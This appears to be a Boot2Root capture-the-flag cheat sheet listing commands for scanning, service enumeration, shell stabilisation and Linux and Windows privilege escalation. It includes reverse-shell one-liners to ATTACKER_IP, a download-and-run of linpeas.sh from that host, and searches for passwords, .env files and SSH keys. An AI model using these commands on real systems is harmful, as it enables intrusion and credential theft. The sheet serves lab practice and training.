# Boot2Root Cheat Sheet

## 1. Host Discovery

```bash
arp-scan -l

nmap -sn 192.168.1.0/24
```

---

## 2. Port Scanning

### Fast Scan

```bash
nmap -T4 -F <IP>
```

### Full Scan

```bash
nmap -p- -T4 <IP>
```

### Service Detection

```bash
nmap -sV -sC <IP>
```

### Aggressive Scan

```bash
nmap -A <IP>
```

### Save Result

```bash
nmap -sC -sV -oN nmap.txt <IP>
```

---

## 3. Web Enumeration

### Gobuster

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
```

### Dirsearch

```bash
dirsearch -u http://IP
```

### Nikto

```bash
nikto -h http://IP
```

### WhatWeb

```bash
whatweb http://IP
```

### View Source

```text
CTRL + U
```

Check:

- comments
- hidden links
- credentials
- JS files

---

## 4. SMB Enumeration

### Anonymous Login

```bash
smbclient -L //<IP> -N
```

### Connect

```bash
smbclient //<IP>/share -N
```

### Enum4Linux

```bash
enum4linux -a <IP>
```

---

## 5. FTP Enumeration

```bash
ftp <IP>
```

Try:

```text
anonymous
anonymous
```

---

## 6. SSH Enumeration

```bash
ssh user@IP
```

Check:

- leaked passwords
- reused credentials

---

## 7. Database Enumeration

### MySQL

```bash
mysql -u root -p -h <IP>
```

### PostgreSQL

```bash
psql -h <IP>
```

---

## 8. Reverse Shell

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Netcat

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

### Listener

```bash
nc -lvnp 4444
```

---

## 9. Stabilize Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

CTRL+Z

```bash
stty raw -echo
fg
```

```bash
export TERM=xterm
```

---

# Linux Privilege Escalation

## Basic Info

```bash
id

whoami

hostname

uname -a
```

```bash
cat /etc/os-release
```

---

## Sudo

```bash
sudo -l
```

Check:

- NOPASSWD
- unusual binaries

Reference:

https://gtfobins.github.io

---

## SUID

```bash
find / -perm -4000 2>/dev/null
```

Interesting:

```text
find
vim
bash
cp
nano
python
perl
```

---

## Capabilities

```bash
getcap -r / 2>/dev/null
```

---

## Cron Jobs

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*
```

---

## Writable Files

```bash
find / -writable 2>/dev/null
```

---

## PATH Hijacking

```bash
echo $PATH
```

Look for:

```text
.
/tmp
writable folders
```

---

## Password Hunting

```bash
history
```

```bash
cat ~/.bash_history
```

```bash
grep -Ri password /home 2>/dev/null
```

```bash
grep -Ri password /var/www 2>/dev/null
```

```bash
find / -name "*.db" 2>/dev/null
```

```bash
find / -name "*.sql" 2>/dev/null
```

```bash
find / -name ".env" 2>/dev/null
```

---

## SSH Keys

```bash
find / -name id_rsa 2>/dev/null
```

---

## Running Processes

```bash
ps aux
```

```bash
ps -ef
```

---

## Internal Services

```bash
ss -tulpn
```

```bash
netstat -tulpn
```

---

## LinPEAS

```bash
wget http://ATTACKER_IP/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
```

---

# Windows Privilege Escalation

## System Info

```cmd
systeminfo
```

---

## Current User

```cmd
whoami
```

```cmd
whoami /all
```

```cmd
whoami /priv
```

---

## Users

```cmd
net user
```

```cmd
net localgroup administrators
```

---

## Services

```cmd
sc query
```

---

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

---

## Network

```cmd
netstat -ano
```

---

## WinPEAS

```cmd
winPEAS.exe
```

---

# Common Flags

## User Flag

```bash
/home/user/user.txt
```

## Root Flag

```bash
/root/root.txt
```

## Windows

```text
Desktop\user.txt

Desktop\root.txt
```

---

# Mindset

1. Enumerate first.
2. Enumerate more.
3. Enumerate again.
4. Baru exploit.

80% Boot2Root selesai karena enumeration yang bagus.